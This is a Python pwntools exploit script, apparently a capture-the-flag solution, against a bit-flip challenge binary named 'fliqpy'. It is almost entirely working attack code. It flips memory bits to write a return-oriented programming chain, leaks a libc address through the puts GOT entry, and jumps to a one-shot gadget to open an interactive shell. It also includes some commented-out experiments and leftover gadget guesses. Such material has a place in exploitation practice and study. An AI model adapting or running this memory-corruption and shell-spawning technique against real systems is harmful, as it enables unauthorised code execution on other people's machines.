from pwn import *
import sys, os


log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "fliqpy"

try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  r = process(bin_name, env = {"LD_PRELOAD":"./libc-2.23.so"})


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

#context.log_level = 'error'

elf = ELF (bin_name);
context.word_size = elf.elfclass

#libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
libc = ELF('libc-2.23.so')

context.terminal = ["tmux", "splitw", "-h"]


def flip (addr, idx):
  r.recvuntil("one bit flip!")
  print ("[-] " + hex (addr)+" " + hex(idx))

  r.sendline ( hex(addr))
  r.sendline (str(idx))
# compare 1 byte
def diff_bit (_c1, _c2):
  c1 = ord (_c1)
  c2 = ord (_c2)

  i = 0
  ret = []
  while True:
    if c1 & 0x1 != c2 & 0x1 :
      ret.append (i)

    c1 >>= 1
    c2 >>= 1
    i += 1

    if i == 8:
      return ret

def chg_str (addr, org, new, length):
  assert (len (org) == len (new) and len (org) == length)

  for i in xrange (length):
    idx = diff_bit (org[i], new[i])

    for j in xrange (len (idx)):
      flip (addr + i, idx[j])

gdb_cmd = """
b * 0x0000000004006C8
b * 0x0000000000400733
c
"""


flip (0x601031, 0)
flip (0x601030, 0)
#flip (0x601028, 4)
#ld_gadget =  0x000000000001b8a9 # -> add rsp, 0xd0; ret ;
#ld_gadget =  0x000000000001b8a9 # -> add rsp, 0xd0; ret ;
ld_gadget =  0x000000000001181a #-> add rsp, 0xd8; ret ;2
ld_gadget = 0x0000000000000e54 #  add rsp, 0x40; pop rbx; pop rbp; pop r12; ret ;
ld_gadget = 0x0000000000010593 #
ld_gadget = 0x000000000001b276
#test
#ld_gadget = 0x0000000000017859
prsppr  = 0x000000000040072d #binary  pop rsp; pop r13; pop r14; pop r15; ret ;
pr =  0x0000000000400733 #-> pop rdi; ret ;
callrdi =  0x0000000000400923 # -> call rdi;
fs = 0x000000000400845 # %p string
ppr =  0x0000000000400731 #-> pop rsi; pop r15; ret ;
pppr = 0x000000000040072c
puts_plt = elf.plt["puts"]
scanf_plt = elf.plt["__isoc99_scanf"]
puts_got = elf.got["puts"]
"""
chg_str (0x601010, p64(0x17870)[:3], p64(0xe79000)[:3], 3)
chg_str (0x601010, p64(0xe79000)[:3], p64(0)[:3], 3)


"""
flip (0x601040, 0)
flip (0x601040, 1)
flip (0x601040, 2)

# target : address of &pay[0]

target = 0x601800

pay = p64(pr) + p64(puts_got) + p64(puts_plt) + p64(pr) + p64(fs)
pay += p64(ppr) + p64(target + 80) + p64(fs) + p64(scanf_plt) + p64(pr) + p64(0x41414141) +p64(callrdi)

chg_str (target, "\x00" * len(pay) , pay , len(pay))

chg_str (0x601008, p64(0x168)[:2], p64(0x4b0)[:2], 2)
chg_str (0x601010, p64(0x17870)[:2], p64(ld_gadget)[:2], 2)

#pause ()

flip (0x40072d, target - 0x18)
flip (0x40072d, target - 0x18)
flip (0x40072d, target - 0x18)
flip (0x40072d, target - 0x18)
flip (0x40072d, target - 0x18)
flip (0x40072d, target - 0x18)
"""
flip (0x40072d, pppr)
flip (0x40072d, pppr)
flip (0x40072d, pppr)
flip (0x40072d, pppr)
flip (0x40072d, pppr)
flip (0x40072d, pppr)
"""

do_debug (gdb_cmd)
flip (0x601030, 0)
flip (0x601031, 0)

r.recvline ()
libc_leak = u64 (r.recvline ().strip ()[-6:] + "\x00\x00")
libc_base = libc_leak - libc.symbols["puts"]
#print "libc_base : " + hex (libc_base)
libc_oneshot = libc_base + 0x4526a

r.sendline (hex(libc_oneshot))
r.sendline ("/usr/bin/id")
#print r.recv ()
r.interactive ()
r.close ()
